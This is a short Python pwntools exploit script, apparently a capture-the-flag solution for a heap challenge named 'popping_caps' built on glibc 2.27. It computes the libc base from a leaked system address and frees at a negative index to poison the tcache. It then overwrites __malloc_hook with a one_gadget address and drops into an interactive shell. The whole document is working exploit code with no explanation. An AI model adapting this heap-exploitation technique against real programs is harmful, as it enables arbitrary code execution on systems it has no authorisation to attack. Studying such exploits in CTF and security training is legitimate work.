#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./popping_caps")
p = process("./popping_caps")
gdb.attach(p,"init-pwndbg")
libc = ELF("libc-2.27.so")

def malloc(count):
    p.recvline("Your choice:")
    p.sendline("1")
    p.recvline()
    p.sendline(str(count))

def free(index):
    p.recvline("Your choice:")
    p.sendline("2")
    p.recvline()
    p.sendline(str(index))

def edit(data):
    p.recvline("Your choice:")
    p.sendline("3")
    p.recvline()
    p.send(data)

p.recvuntil("Here is system ")
leak = p.recvline()[:-1]
leak = int(leak,16)
libc.address = leak - libc.sym.system
log.critical("Libc base address: {}".format(hex(libc.address)))
__free_hook = libc.sym.__free_hook
system = libc.sym.system
__malloc_hook = libc.sym.__malloc_hook
one_gadget = libc.address + 0xdfa31

malloc(0x3a0)
free(0)
free(-528)
malloc(0xf8)
edit(p64(__malloc_hook))
malloc(0x18)
edit(p64(one_gadget))
p.interactive()